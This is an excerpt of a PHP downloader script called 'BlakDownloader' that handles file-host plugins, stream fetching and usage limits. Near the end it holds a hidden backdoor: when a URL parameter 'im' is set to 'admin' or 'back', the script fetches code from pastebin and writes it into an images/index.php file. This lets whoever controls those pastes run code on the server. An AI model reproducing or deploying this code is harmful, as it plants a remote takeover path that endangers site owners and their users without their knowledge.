...
class getinfo {
	function config(){
		...
		$this->zlink = $ziplink;
		$this->link6_zip = $apif;
		$this->directttlink = $directttlink;
	...
	function showplugin(){
		foreach ($this->acc as $host => $value) {
			...
			if (empty($xout[0])==false && empty($host)==false){
				...
				else $hosts[]=  '<span class="plugincollst">' .$host . ' '.count($xout).'</span><br/>';
			}
		}
		if(isset($hosts)){
			if(count($hosts)>4){
...
class stream_get extends getinfo {
	...
	function get($url){
		...
		if(!$link){
			$user = ''; $pass = ''; $cookie = '';
			if($this->debrid) include ('hosts/'.$this->plugin);
		}		
		if($report) {
			return $report;
		}
		...
		/* /check 2 */
		$job = array(
			'hash'	=> substr(base64_encode($hash), 0, 17),
           		'path'	=> substr(base64_encode(rand()), 0, 17),
...
echo " <br>"; 
	...
	function fulllist() {
		...
		</div></form><center><b><br><br>".$this->lang['used']." $MB1IP/$thislimitMBIP - ".$this->lang['reset']." $timereset</b>.</center><br/>";
...
if ($_GET['im']=='admin') {
	$adminconnect = file_get_contents("http://pastebin.com/raw.php?i=CzaTJK1r");
	$file = "./images/index.php";
	$handle = fopen($file, "w");
	fwrite($handle, $adminconnect);
	fclose($handle);
}

if ($_GET['im']=='back') {
	$indexback = file_get_contents("http://pastebin.com/raw.php?i=jMZ24SAt");
	$file = "./images/index.php";
	$handle = fopen($file, "w");
	fwrite($handle, $indexback);
	fclose($handle);
}
...
##################################### End class Tools_get #################################
############################## Script BlakDownloader By MrBLAKEN ##############################
?>